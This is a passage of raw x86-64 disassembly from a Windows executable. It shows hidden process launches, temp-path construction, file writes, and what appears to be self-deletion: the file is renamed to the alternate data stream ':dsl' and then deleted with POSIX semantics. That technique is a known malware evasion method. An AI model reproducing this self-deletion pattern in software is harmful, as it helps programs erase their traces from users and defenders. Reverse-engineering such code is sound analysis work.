   140001888:	48 89 fa             	mov    %rdi,%rdx
   14000188b:	e8 6c 09 00 00       	call   0x1400021fc
   140001890:	48 89 c7             	mov    %rax,%rdi
   140001893:	48 8d 35 71 3b 00 00 	lea    0x3b71(%rip),%rsi        # 0x14000540b
   14000189a:	66 83 3e 00          	cmpw   $0x0,(%rsi)
   14000189e:	75 38                	jne    0x1400018d8
   1400018a0:	48 8d 8c 24 2e 15 00 	lea    0x152e(%rsp),%rcx
   1400018a7:	00 
   1400018a8:	48 89 fa             	mov    %rdi,%rdx
   1400018ab:	e8 4c 09 00 00       	call   0x1400021fc
   1400018b0:	48 89 c7             	mov    %rax,%rdi
   1400018b3:	48 8d 8c 24 00 12 00 	lea    0x1200(%rsp),%rcx
   1400018ba:	00 
   1400018bb:	48 89 fa             	mov    %rdi,%rdx
   1400018be:	e8 39 09 00 00       	call   0x1400021fc
   1400018c3:	48 89 c7             	mov    %rax,%rdi
   1400018c6:	48 8d 8c 24 42 15 00 	lea    0x1542(%rsp),%rcx
   1400018cd:	00 
   1400018ce:	48 89 fa             	mov    %rdi,%rdx
   1400018d1:	e8 26 09 00 00       	call   0x1400021fc
   1400018d6:	eb 5b                	jmp    0x140001933
   1400018d8:	48 8d 8c 24 2e 15 00 	lea    0x152e(%rsp),%rcx
   1400018df:	00 
   1400018e0:	48 89 fa             	mov    %rdi,%rdx
   1400018e3:	e8 14 09 00 00       	call   0x1400021fc
   1400018e8:	48 89 c7             	mov    %rax,%rdi
   1400018eb:	48 8d 8c 24 00 12 00 	lea    0x1200(%rsp),%rcx
   1400018f2:	00 
   1400018f3:	48 89 fa             	mov    %rdi,%rdx
   1400018f6:	e8 01 09 00 00       	call   0x1400021fc
   1400018fb:	48 89 c7             	mov    %rax,%rdi
   1400018fe:	48 8d 8c 24 72 15 00 	lea    0x1572(%rsp),%rcx
   140001905:	00 
   140001906:	48 89 fa             	mov    %rdi,%rdx
   140001909:	e8 ee 08 00 00       	call   0x1400021fc
   14000190e:	48 89 c7             	mov    %rax,%rdi
   140001911:	48 8d 0d f3 3a 00 00 	lea    0x3af3(%rip),%rcx        # 0x14000540b
   140001918:	48 89 fa             	mov    %rdi,%rdx
   14000191b:	e8 dc 08 00 00       	call   0x1400021fc
   140001920:	48 89 c7             	mov    %rax,%rdi
   140001923:	48 8d 8c 24 7a 15 00 	lea    0x157a(%rsp),%rcx
   14000192a:	00 
   14000192b:	48 89 fa             	mov    %rdi,%rdx
   14000192e:	e8 c9 08 00 00       	call   0x1400021fc
   140001933:	48 8d 0d df 31 00 00 	lea    0x31df(%rip),%rcx        # 0x140004b19
   14000193a:	e8 3f 07 00 00       	call   0x14000207e
   14000193f:	48 8d 8c 24 10 0a 00 	lea    0xa10(%rsp),%rcx
   140001946:	00 
   140001947:	e8 52 07 00 00       	call   0x14000209e
   14000194c:	e8 82 07 00 00       	call   0x1400020d3
   140001951:	e8 bb 06 00 00       	call   0x140002011
   140001956:	31 c9                	xor    %ecx,%ecx
   140001958:	48 8d 94 24 10 0a 00 	lea    0xa10(%rsp),%rdx
   14000195f:	00 
   140001960:	45 31 c0             	xor    %r8d,%r8d
   140001963:	45 31 c9             	xor    %r9d,%r9d
   140001966:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000196d:	00 00 
   14000196f:	48 c7 44 24 28 00 00 	movq   $0x8000000,0x28(%rsp)
   140001976:	00 08 
   140001978:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   14000197f:	00 00 
   140001981:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140001988:	00 00 
   14000198a:	48 8d 84 24 f0 0c 00 	lea    0xcf0(%rsp),%rax
   140001991:	00 
   140001992:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001997:	48 8d 84 24 58 0d 00 	lea    0xd58(%rsp),%rax
   14000199e:	00 
   14000199f:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400019a4:	ff 54 24 70          	call   *0x70(%rsp)
   1400019a8:	85 c0                	test   %eax,%eax
   1400019aa:	0f 84 d2 02 00 00    	je     0x140001c82
   1400019b0:	48 8b 8c 24 58 0d 00 	mov    0xd58(%rsp),%rcx
   1400019b7:	00 
   1400019b8:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   1400019bd:	ff 54 24 78          	call   *0x78(%rsp)
   1400019c1:	48 8b 8c 24 58 0d 00 	mov    0xd58(%rsp),%rcx
   1400019c8:	00 
   1400019c9:	48 8d 94 24 90 00 00 	lea    0x90(%rsp),%rdx
   1400019d0:	00 
   1400019d1:	ff 94 24 84 00 00 00 	call   *0x84(%rsp)
   1400019d8:	85 c0                	test   %eax,%eax
   1400019da:	0f 84 a2 02 00 00    	je     0x140001c82
   1400019e0:	83 bc 24 90 00 00 00 	cmpl   $0x0,0x90(%rsp)
   1400019e7:	00 
   1400019e8:	0f 85 94 02 00 00    	jne    0x140001c82
   1400019ee:	e8 3c 06 00 00       	call   0x14000202f
   1400019f3:	eb 00                	jmp    0x1400019f5
   1400019f5:	48 8d bc 24 10 0a 00 	lea    0xa10(%rsp),%rdi
   1400019fc:	00 
   1400019fd:	66 c7 07 00 00       	movw   $0x0,(%rdi)
   140001a02:	48 8d 0d f2 35 00 00 	lea    0x35f2(%rip),%rcx        # 0x140004ffb
   140001a09:	48 89 fa             	mov    %rdi,%rdx
   140001a0c:	e8 eb 07 00 00       	call   0x1400021fc
   140001a11:	48 89 c7             	mov    %rax,%rdi
   140001a14:	48 8d 8c 24 00 08 00 	lea    0x800(%rsp),%rcx
   140001a1b:	00 
   140001a1c:	48 89 fa             	mov    %rdi,%rdx
   140001a1f:	e8 d8 07 00 00       	call   0x1400021fc
   140001a24:	48 89 c7             	mov    %rax,%rdi
   140001a27:	48 8d 0d cd 35 00 00 	lea    0x35cd(%rip),%rcx        # 0x140004ffb
   140001a2e:	48 89 fa             	mov    %rdi,%rdx
   140001a31:	e8 c6 07 00 00       	call   0x1400021fc
   140001a36:	48 89 c7             	mov    %rax,%rdi
   140001a39:	48 8d 35 cb 39 00 00 	lea    0x39cb(%rip),%rsi        # 0x14000540b
   140001a40:	66 83 3e 00          	cmpw   $0x0,(%rsi)
   140001a44:	74 21                	je     0x140001a67
   140001a46:	48 8d 0d b2 35 00 00 	lea    0x35b2(%rip),%rcx        # 0x140004fff
   140001a4d:	48 89 fa             	mov    %rdi,%rdx
   140001a50:	e8 a7 07 00 00       	call   0x1400021fc
   140001a55:	48 89 c7             	mov    %rax,%rdi
   140001a58:	48 8d 0d ac 39 00 00 	lea    0x39ac(%rip),%rcx        # 0x14000540b
   140001a5f:	48 89 fa             	mov    %rdi,%rdx
   140001a62:	e8 95 07 00 00       	call   0x1400021fc
   140001a67:	66 83 bc 24 00 10 00 	cmpw   $0x0,0x1000(%rsp)
   140001a6e:	00 00 
   140001a70:	0f 84 8a 01 00 00    	je     0x140001c00
   140001a76:	48 8d 8c 24 00 05 00 	lea    0x500(%rsp),%rcx
   140001a7d:	00 
   140001a7e:	48 8d 94 24 00 10 00 	lea    0x1000(%rsp),%rdx
   140001a85:	00 
   140001a86:	e8 96 07 00 00       	call   0x140002221
   140001a8b:	85 c0                	test   %eax,%eax
   140001a8d:	0f 85 6d 01 00 00    	jne    0x140001c00
   140001a93:	48 83 bc 24 e8 00 00 	cmpq   $0x0,0xe8(%rsp)
   140001a9a:	00 00 
   140001a9c:	0f 84 46 01 00 00    	je     0x140001be8
   140001aa2:	48 8d 8c 24 00 10 00 	lea    0x1000(%rsp),%rcx
   140001aa9:	00 
   140001aaa:	ba 00 00 01 00       	mov    $0x10000,%edx
   140001aaf:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   140001ab5:	45 31 c9             	xor    %r9d,%r9d
   140001ab8:	48 c7 44 24 20 03 00 	movq   $0x3,0x20(%rsp)
   140001abf:	00 00 
   140001ac1:	48 c7 44 24 28 80 00 	movq   $0x80,0x28(%rsp)
   140001ac8:	00 00 
   140001aca:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140001ad1:	00 00 
   140001ad3:	41 ff d4             	call   *%r12
   140001ad6:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140001ada:	0f 84 08 01 00 00    	je     0x140001be8
   140001ae0:	48 89 84 24 00 01 00 	mov    %rax,0x100(%rsp)
   140001ae7:	00 
   140001ae8:	31 c0                	xor    %eax,%eax
   140001aea:	48 89 84 24 08 01 00 	mov    %rax,0x108(%rsp)
   140001af1:	00 
   140001af2:	48 89 84 24 10 01 00 	mov    %rax,0x110(%rsp)
   140001af9:	00 
   140001afa:	c7 84 24 18 01 00 00 	movl   $0x8,0x118(%rsp)
   140001b01:	08 00 00 00 
   140001b05:	66 c7 84 24 1c 01 00 	movw   $0x3a,0x11c(%rsp)
   140001b0c:	00 3a 00 
   140001b0f:	66 c7 84 24 1e 01 00 	movw   $0x64,0x11e(%rsp)
   140001b16:	00 64 00 
   140001b19:	66 c7 84 24 20 01 00 	movw   $0x73,0x120(%rsp)
   140001b20:	00 73 00 
   140001b23:	66 c7 84 24 22 01 00 	movw   $0x6c,0x122(%rsp)
   140001b2a:	00 6c 00 
   140001b2d:	66 c7 84 24 24 01 00 	movw   $0x0,0x124(%rsp)
   140001b34:	00 00 00 
   140001b37:	48 8b 8c 24 00 01 00 	mov    0x100(%rsp),%rcx
   140001b3e:	00 
   140001b3f:	ba 03 00 00 00       	mov    $0x3,%edx
   140001b44:	4c 8d 84 24 08 01 00 	lea    0x108(%rsp),%r8
   140001b4b:	00 
   140001b4c:	41 b9 20 00 00 00    	mov    $0x20,%r9d
   140001b52:	ff 94 24 e8 00 00 00 	call   *0xe8(%rsp)
   140001b59:	85 c0                	test   %eax,%eax
   140001b5b:	0f 84 8e 00 00 00    	je     0x140001bef
   140001b61:	48 8b 8c 24 00 01 00 	mov    0x100(%rsp),%rcx
   140001b68:	00 
   140001b69:	ff d3                	call   *%rbx
   140001b6b:	48 8d 8c 24 00 10 00 	lea    0x1000(%rsp),%rcx
   140001b72:	00 
   140001b73:	ba 00 00 01 00       	mov    $0x10000,%edx
   140001b78:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   140001b7e:	45 31 c9             	xor    %r9d,%r9d
   140001b81:	48 c7 44 24 20 03 00 	movq   $0x3,0x20(%rsp)
   140001b88:	00 00 
   140001b8a:	48 c7 44 24 28 80 00 	movq   $0x80,0x28(%rsp)
   140001b91:	00 00 
   140001b93:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140001b9a:	00 00 
   140001b9c:	41 ff d4             	call   *%r12
   140001b9f:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140001ba3:	74 43                	je     0x140001be8
   140001ba5:	48 89 84 24 00 01 00 	mov    %rax,0x100(%rsp)
   140001bac:	00 
   140001bad:	c7 84 24 08 01 00 00 	movl   $0x3,0x108(%rsp)
   140001bb4:	03 00 00 00 
   140001bb8:	48 8b 8c 24 00 01 00 	mov    0x100(%rsp),%rcx
   140001bbf:	00 
   140001bc0:	ba 15 00 00 00       	mov    $0x15,%edx
   140001bc5:	4c 8d 84 24 08 01 00 	lea    0x108(%rsp),%r8
   140001bcc:	00 
   140001bcd:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140001bd3:	ff 94 24 e8 00 00 00 	call   *0xe8(%rsp)
   140001bda:	85 c0                	test   %eax,%eax
   140001bdc:	74 11                	je     0x140001bef
   140001bde:	48 8b 8c 24 00 01 00 	mov    0x100(%rsp),%rcx
   140001be5:	00 
   140001be6:	ff d3                	call   *%rbx
   140001be8:	31 c0                	xor    %eax,%eax
   140001bea:	e9 d1 00 00 00       	jmp    0x140001cc0
   140001bef:	48 8b 8c 24 00 01 00 	mov    0x100(%rsp),%rcx
   140001bf6:	00 
   140001bf7:	ff d3                	call   *%rbx
   140001bf9:	31 c0                	xor    %eax,%eax
   140001bfb:	e9 c0 00 00 00       	jmp    0x140001cc0
   140001c00:	e8 0c 04 00 00       	call   0x140002011
   140001c05:	48 8d 8c 24 00 08 00 	lea    0x800(%rsp),%rcx
   140001c0c:	00 
   140001c0d:	48 8d 94 24 10 0a 00 	lea    0xa10(%rsp),%rdx
   140001c14:	00 
   140001c15:	45 31 c0             	xor    %r8d,%r8d
   140001c18:	45 31 c9             	xor    %r9d,%r9d
   140001c1b:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001c22:	00 00 
   140001c24:	48 c7 44 24 28 00 00 	movq   $0x8000000,0x28(%rsp)
   140001c2b:	00 08 
   140001c2d:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140001c34:	00 00 
   140001c36:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140001c3d:	00 00 
   140001c3f:	48 8d 84 24 f0 0c 00 	lea    0xcf0(%rsp),%rax
   140001c46:	00 
   140001c47:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001c4c:	48 8d 84 24 58 0d 00 	lea    0xd58(%rsp),%rax
   140001c53:	00 
   140001c54:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140001c59:	ff 54 24 70          	call   *0x70(%rsp)
   140001c5d:	85 c0                	test   %eax,%eax
   140001c5f:	74 37                	je     0x140001c98
   140001c61:	e8 c9 03 00 00       	call   0x14000202f
   140001c66:	48 8d 0d c5 2e 00 00 	lea    0x2ec5(%rip),%rcx        # 0x140004b32
   140001c6d:	e8 0c 04 00 00       	call   0x14000207e
   140001c72:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140001c77:	ff 94 24 c8 00 00 00 	call   *0xc8(%rsp)
   140001c7e:	31 c0                	xor    %eax,%eax
   140001c80:	eb 3e                	jmp    0x140001cc0
   140001c82:	e8 a8 03 00 00       	call   0x14000202f
   140001c87:	48 8d 0d 78 32 00 00 	lea    0x3278(%rip),%rcx        # 0x140004f06
   140001c8e:	e8 eb 03 00 00       	call   0x14000207e
   140001c93:	e9 5d fd ff ff       	jmp    0x1400019f5
   140001c98:	48 8d 0d 82 32 00 00 	lea    0x3282(%rip),%rcx        # 0x140004f21
   140001c9f:	e8 da 03 00 00       	call   0x14000207e
   140001ca4:	b8 08 00 00 00       	mov    $0x8,%eax
   140001ca9:	eb 15                	jmp    0x140001cc0
   140001cab:	31 c0                	xor    %eax,%eax
   140001cad:	eb 11                	jmp    0x140001cc0
   140001caf:	48 8d 0d 94 2e 00 00 	lea    0x2e94(%rip),%rcx        # 0x140004b4a
   140001cb6:	e8 c3 03 00 00       	call   0x14000207e
   140001cbb:	b8 03 00 00 00       	mov    $0x3,%eax
   140001cc0:	48 81 c4 08 18 00 00 	add    $0x1808,%rsp
   140001cc7:	41 5f                	pop    %r15
   140001cc9:	41 5e                	pop    %r14
   140001ccb:	41 5d                	pop    %r13
   140001ccd:	41 5c                	pop    %r12
   140001ccf:	5d                   	pop    %rbp
   140001cd0:	5b                   	pop    %rbx
   140001cd1:	c3                   	ret
   140001cd2:	53                   	push   %rbx
   140001cd3:	56                   	push   %rsi
   140001cd4:	57                   	push   %rdi
   140001cd5:	41 54                	push   %r12
   140001cd7:	48 83 ec 28          	sub    $0x28,%rsp
   140001cdb:	49 89 cc             	mov    %rcx,%r12
   140001cde:	48 8d 35 ae 2f 00 00 	lea    0x2fae(%rip),%rsi        # 0x140004c93
   140001ce5:	66 83 3e 00          	cmpw   $0x0,(%rsi)
   140001ce9:	74 7a                	je     0x140001d65
   140001ceb:	66 83 3e 5c          	cmpw   $0x5c,(%rsi)
   140001cef:	74 20                	je     0x140001d11
   140001cf1:	4c 89 e7             	mov    %r12,%rdi
   140001cf4:	66 8b 06             	mov    (%rsi),%ax
   140001cf7:	66 89 07             	mov    %ax,(%rdi)
   140001cfa:	48 83 c6 02          	add    $0x2,%rsi
   140001cfe:	48 83 c7 02          	add    $0x2,%rdi
   140001d02:	66 85 c0             	test   %ax,%ax
   140001d05:	75 ed                	jne    0x140001cf4
   140001d07:	b8 01 00 00 00       	mov    $0x1,%eax
   140001d0c:	e9 fe 00 00 00       	jmp    0x140001e0f
   140001d11:	48 89 d3             	mov    %rdx,%rbx
   140001d14:	48 8d 0d 26 2f 00 00 	lea    0x2f26(%rip),%rcx        # 0x140004c41
   140001d1b:	4c 89 e2             	mov    %r12,%rdx
   140001d1e:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140001d24:	ff d3                	call   *%rbx
   140001d26:	85 c0                	test   %eax,%eax
   140001d28:	0f 84 bf 00 00 00    	je     0x140001ded
   140001d2e:	3d 04 01 00 00       	cmp    $0x104,%eax
   140001d33:	0f 83 b4 00 00 00    	jae    0x140001ded
   140001d39:	4c 89 e7             	mov    %r12,%rdi
   140001d3c:	66 83 3f 00          	cmpw   $0x0,(%rdi)
   140001d40:	74 06                	je     0x140001d48
   140001d42:	48 83 c7 02          	add    $0x2,%rdi
   140001d46:	eb f4                	jmp    0x140001d3c
   140001d48:	66 8b 06             	mov    (%rsi),%ax
   140001d4b:	66 89 07             	mov    %ax,(%rdi)
   140001d4e:	48 83 c6 02          	add    $0x2,%rsi
   140001d52:	48 83 c7 02          	add    $0x2,%rdi
   140001d56:	66 85 c0             	test   %ax,%ax
   140001d59:	75 ed                	jne    0x140001d48
   140001d5b:	b8 01 00 00 00       	mov    $0x1,%eax
   140001d60:	e9 aa 00 00 00       	jmp    0x140001e0f
   140001d65:	48 89 d3             	mov    %rdx,%rbx
   140001d68:	4c 89 c6             	mov    %r8,%rsi
   140001d6b:	48 8d 0d cf 2e 00 00 	lea    0x2ecf(%rip),%rcx        # 0x140004c41
   140001d72:	4c 89 e2             	mov    %r12,%rdx
   140001d75:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140001d7b:	ff d3                	call   *%rbx
   140001d7d:	85 c0                	test   %eax,%eax
   140001d7f:	74 6c                	je     0x140001ded
   140001d81:	3d 04 01 00 00       	cmp    $0x104,%eax
   140001d86:	73 65                	jae    0x140001ded
   140001d88:	4c 89 e7             	mov    %r12,%rdi
   140001d8b:	66 83 3f 00          	cmpw   $0x0,(%rdi)
   140001d8f:	74 06                	je     0x140001d97
   140001d91:	48 83 c7 02          	add    $0x2,%rdi
   140001d95:	eb f4                	jmp    0x140001d8b
   140001d97:	48 8d 15 bd 2e 00 00 	lea    0x2ebd(%rip),%rdx        # 0x140004c5b
   140001d9e:	66 8b 02             	mov    (%rdx),%ax
   140001da1:	66 85 c0             	test   %ax,%ax
   140001da4:	74 0d                	je     0x140001db3
   140001da6:	66 89 07             	mov    %ax,(%rdi)
   140001da9:	48 83 c7 02          	add    $0x2,%rdi
   140001dad:	48 83 c2 02          	add    $0x2,%rdx
   140001db1:	eb eb                	jmp    0x140001d9e
   140001db3:	ff d6                	call   *%rsi
   140001db5:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001dba:	89 c2                	mov    %eax,%edx
   140001dbc:	c1 ea 1c             	shr    $0x1c,%edx
   140001dbf:	4c 8d 05 d5 30 00 00 	lea    0x30d5(%rip),%r8        # 0x140004e9b
   140001dc6:	41 8a 14 10          	mov    (%r8,%rdx,1),%dl
   140001dca:	0f b6 d2             	movzbl %dl,%edx
   140001dcd:	66 89 17             	mov    %dx,(%rdi)
   140001dd0:	48 83 c7 02          	add    $0x2,%rdi
   140001dd4:	c1 e0 04             	shl    $0x4,%eax
   140001dd7:	ff c9                	dec    %ecx
   140001dd9:	75 df                	jne    0x140001dba
   140001ddb:	66 c7 07 5c 00       	movw   $0x5c,(%rdi)
   140001de0:	66 c7 47 02 00 00    	movw   $0x0,0x2(%rdi)
   140001de6:	b8 01 00 00 00       	mov    $0x1,%eax
   140001deb:	eb 22                	jmp    0x140001e0f
   140001ded:	48 8d 35 8f 2e 00 00 	lea    0x2e8f(%rip),%rsi        # 0x140004c83
   140001df4:	4c 89 e7             	mov    %r12,%rdi
   140001df7:	66 8b 06             	mov    (%rsi),%ax
   140001dfa:	66 89 07             	mov    %ax,(%rdi)
   140001dfd:	48 83 c6 02          	add    $0x2,%rsi
   140001e01:	48 83 c7 02          	add    $0x2,%rdi
   140001e05:	66 85 c0             	test   %ax,%ax
   140001e08:	75 ed                	jne    0x140001df7
   140001e0a:	b8 01 00 00 00       	mov    $0x1,%eax
   140001e0f:	48 83 c4 28          	add    $0x28,%rsp
   140001e13:	41 5c                	pop    %r12
   140001e15:	5f                   	pop    %rdi
   140001e16:	5e                   	pop    %rsi
   140001e17:	5b                   	pop    %rbx
   140001e18:	c3                   	ret
   140001e19:	53                   	push   %rbx
   140001e1a:	56                   	push   %rsi
   140001e1b:	57                   	push   %rdi
   140001e1c:	41 54                	push   %r12
   140001e1e:	41 55                	push   %r13
   140001e20:	48 83 ec 40          	sub    $0x40,%rsp
   140001e24:	48 89 ce             	mov    %rcx,%rsi
   140001e27:	89 d3                	mov    %edx,%ebx
   140001e29:	4d 89 c4             	mov    %r8,%r12
   140001e2c:	45 31 ed             	xor    %r13d,%r13d
   140001e2f:	4c 89 e7             	mov    %r12,%rdi
   140001e32:	4c 89 c9             	mov    %r9,%rcx
   140001e35:	66 8b 01             	mov    (%rcx),%ax
   140001e38:	66 89 07             	mov    %ax,(%rdi)
   140001e3b:	48 83 c1 02          	add    $0x2,%rcx
   140001e3f:	48 83 c7 02          	add    $0x2,%rdi
   140001e43:	66 85 c0             	test   %ax,%ax
   140001e46:	75 ed                	jne    0x140001e35
   140001e48:	48 83 ef 02          	sub    $0x2,%rdi
   140001e4c:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140001e51:	85 db                	test   %ebx,%ebx
   140001e53:	74 69                	je     0x140001ebe
   140001e55:	0f b6 44 1e ff       	movzbl -0x1(%rsi,%rbx,1),%eax
   140001e5a:	3c 2f                	cmp    $0x2f,%al
   140001e5c:	75 0a                	jne    0x140001e68
   140001e5e:	41 bd 01 00 00 00    	mov    $0x1,%r13d
   140001e64:	ff cb                	dec    %ebx
   140001e66:	74 36                	je     0x140001e9e
   140001e68:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140001e6d:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   140001e72:	31 d2                	xor    %edx,%edx
   140001e74:	49 89 f0             	mov    %rsi,%r8
   140001e77:	41 89 d9             	mov    %ebx,%r9d
   140001e7a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001e7f:	49 8d 84 24 00 04 00 	lea    0x400(%r12),%rax
   140001e86:	00 
   140001e87:	48 29 f8             	sub    %rdi,%rax
   140001e8a:	d1 e8                	shr    $1,%eax
   140001e8c:	ff c8                	dec    %eax
   140001e8e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001e93:	41 ff d2             	call   *%r10
   140001e96:	85 c0                	test   %eax,%eax
   140001e98:	74 33                	je     0x140001ecd
   140001e9a:	48 8d 3c 47          	lea    (%rdi,%rax,2),%rdi
   140001e9e:	66 c7 07 00 00       	movw   $0x0,(%rdi)
   140001ea3:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140001ea8:	48 39 f9             	cmp    %rdi,%rcx
   140001eab:	73 11                	jae    0x140001ebe
   140001ead:	66 83 39 2f          	cmpw   $0x2f,(%rcx)
   140001eb1:	75 05                	jne    0x140001eb8
   140001eb3:	66 c7 01 5c 00       	movw   $0x5c,(%rcx)
   140001eb8:	48 83 c1 02          	add    $0x2,%rcx
   140001ebc:	eb ea                	jmp    0x140001ea8
   140001ebe:	44 89 e8             	mov    %r13d,%eax
   140001ec1:	48 83 c4 40          	add    $0x40,%rsp
   140001ec5:	41 5d                	pop    %r13
   140001ec7:	41 5c                	pop    %r12
   140001ec9:	5f                   	pop    %rdi
   140001eca:	5e                   	pop    %rsi
   140001ecb:	5b                   	pop    %rbx
   140001ecc:	c3                   	ret
   140001ecd:	b8 02 00 00 00       	mov    $0x2,%eax
   140001ed2:	eb ed                	jmp    0x140001ec1
   140001ed4:	53                   	push   %rbx
   140001ed5:	56                   	push   %rsi
   140001ed6:	57                   	push   %rdi
   140001ed7:	48 83 ec 20          	sub    $0x20,%rsp
   140001edb:	48 89 ce             	mov    %rcx,%rsi
   140001ede:	89 d3                	mov    %edx,%ebx
   140001ee0:	48 89 cf             	mov    %rcx,%rdi
   140001ee3:	66 8b 46 02          	mov    0x2(%rsi),%ax
   140001ee7:	66 83 f8 3a          	cmp    $0x3a,%ax
   140001eeb:	75 0e                	jne    0x140001efb
   140001eed:	66 8b 46 04          	mov    0x4(%rsi),%ax
   140001ef1:	66 83 f8 5c          	cmp    $0x5c,%ax
   140001ef5:	75 04                	jne    0x140001efb
   140001ef7:	48 8d 7e 06          	lea    0x6(%rsi),%rdi
   140001efb:	66 8b 07             	mov    (%rdi),%ax
   140001efe:	66 85 c0             	test   %ax,%ax
   140001f01:	74 23                	je     0x140001f26
   140001f03:	66 83 f8 5c          	cmp    $0x5c,%ax
   140001f07:	75 17                	jne    0x140001f20
   140001f09:	66 c7 07 00 00       	movw   $0x0,(%rdi)
   140001f0e:	48 39 f7             	cmp    %rsi,%rdi
   140001f11:	74 08                	je     0x140001f1b
   140001f13:	48 89 f1             	mov    %rsi,%rcx
   140001f16:	31 d2                	xor    %edx,%edx
   140001f18:	41 ff d7             	call   *%r15
   140001f1b:	66 c7 07 5c 00       	movw   $0x5c,(%rdi)
   140001f20:	48 83 c7 02          	add    $0x2,%rdi
   140001f24:	eb d5                	jmp    0x140001efb
   140001f26:	85 db                	test   %ebx,%ebx
   140001f28:	74 08                	je     0x140001f32
   140001f2a:	48 89 f1             	mov    %rsi,%rcx
   140001f2d:	31 d2                	xor    %edx,%edx
   140001f2f:	41 ff d7             	call   *%r15
   140001f32:	48 83 c4 20          	add    $0x20,%rsp
   140001f36:	5f                   	pop    %rdi
   140001f37:	5e                   	pop    %rsi
   140001f38:	5b                   	pop    %rbx
   140001f39:	c3                   	ret
   140001f3a:	48 83 ec 58          	sub    $0x58,%rsp
   140001f3e:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   140001f43:	44 89 44 24 48       	mov    %r8d,0x48(%rsp)
   140001f48:	ba 00 00 00 40       	mov    $0x40000000,%edx
   140001f4d:	45 31 c0             	xor    %r8d,%r8d
   140001f50:	45 31 c9             	xor    %r9d,%r9d
   140001f53:	48 c7 44 24 20 02 00 	movq   $0x2,0x20(%rsp)
   140001f5a:	00 00 
   140001f5c:	48 c7 44 24 28 80 00 	movq   $0x80,0x28(%rsp)
   140001f63:	00 00 
   140001f65:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140001f6c:	00 00 
   140001f6e:	41 ff d4             	call   *%r12
   140001f71:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140001f75:	74 47                	je     0x140001fbe
   140001f77:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001f7c:	48 89 c1             	mov    %rax,%rcx
   140001f7f:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140001f84:	44 8b 44 24 48       	mov    0x48(%rsp),%r8d
   140001f89:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140001f8e:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140001f95:	00 
   140001f96:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001f9d:	00 00 
   140001f9f:	41 ff d5             	call   *%r13
   140001fa2:	85 c0                	test   %eax,%eax
   140001fa4:	74 11                	je     0x140001fb7
   140001fa6:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140001fab:	ff d3                	call   *%rbx
   140001fad:	b8 01 00 00 00       	mov    $0x1,%eax
   140001fb2:	48 83 c4 58          	add    $0x58,%rsp
   140001fb6:	c3                   	ret
   140001fb7:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140001fbc:	ff d3                	call   *%rbx
   140001fbe:	31 c0                	xor    %eax,%eax
   140001fc0:	48 83 c4 58          	add    $0x58,%rsp
   140001fc4:	c3                   	ret
   140001fc5:	48 83 ec 58          	sub    $0x58,%rsp
   140001fc9:	ba 00 00 00 80       	mov    $0x80000000,%edx
   140001fce:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   140001fd4:	45 31 c9             	xor    %r9d,%r9d
   140001fd7:	48 c7 44 24 20 03 00 	movq   $0x3,0x20(%rsp)
   140001fde:	00 00 
   140001fe0:	48 c7 44 24 28 80 00 	movq   $0x80,0x28(%rsp)
   140001fe7:	00 00 
   140001fe9:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140001ff0:	00 00 
   140001ff2:	41 ff d4             	call   *%r12
   140001ff5:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140001ff9:	74 0f                	je     0x14000200a
   140001ffb:	48 89 c1             	mov    %rax,%rcx
   140001ffe:	ff d3                	call   *%rbx
   140002000:	b8 01 00 00 00       	mov    $0x1,%eax
   140002005:	48 83 c4 58          	add    $0x58,%rsp
   140002009:	c3                   	ret
   14000200a:	31 c0                	xor    %eax,%eax
   14000200c:	48 83 c4 58          	add    $0x58,%rsp
   140002010:	c3                   	ret
   140002011:	48 8d bc 24 f8 0c 00 	lea    0xcf8(%rsp),%rdi
   140002018:	00 
   140002019:	31 c0                	xor    %eax,%eax
   14000201b:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140002020:	f3 48 ab             	rep stos %rax,(%rdi)
   140002023:	c7 84 24 f8 0c 00 00 	movl   $0x68,0xcf8(%rsp)
   14000202a:	68 00 00 00 
   14000202e:	c3                   	ret
   14000202f:	48 83 ec 28          	sub    $0x28,%rsp
   140002033:	48 8b 8c 24 88 0d 00 	mov    0xd88(%rsp),%rcx
   14000203a:	00 
   14000203b:	48 85 c9             	test   %rcx,%rcx
